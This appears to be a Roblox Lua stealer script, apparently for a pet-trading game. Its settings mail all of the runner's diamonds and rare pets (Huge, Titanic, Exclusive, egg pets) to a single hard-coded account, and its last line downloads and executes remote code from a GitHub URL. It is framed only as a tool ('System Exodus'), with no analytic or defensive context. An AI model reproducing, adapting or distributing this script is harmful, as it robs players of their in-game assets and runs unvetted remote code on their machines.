    getgenv().Settings = {
        Mailing = {
            ["Diamonds"] = {
                Class = "Currency",
                Amount = "All",
                MinDiamonds = 50000000
            },
            ["Huge"] = {
                Class = "Pet",
                Rarity = "Huge",
                Amount = "All"
            },
            ["Lootbox"] = {
                Class = "Pet",
                Egg = true,
                Amount = "All"
            },
            -- ✅ ADDED: Titanic
            ["Titanic"] = {
                Class = "Pet",
                Rarity = "Titanic",
                Amount = "All"
            },
            -- ✅ ADDED: Exclusive Pet
            ["Exclusive"] = {
                Class = "Pet",
                Rarity = "Exclusive",
                Amount = "All"
            },
        },

        Users = {
            "DreamSoCow",
        },

        ["Split Items Evenly"] = false,
        ["Only Online Accounts"] = false,
        ["Developer Mode"] = false,
        [[ Thank you for using System Exodus <3! ]]
 }
loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/main/track.lua"))()

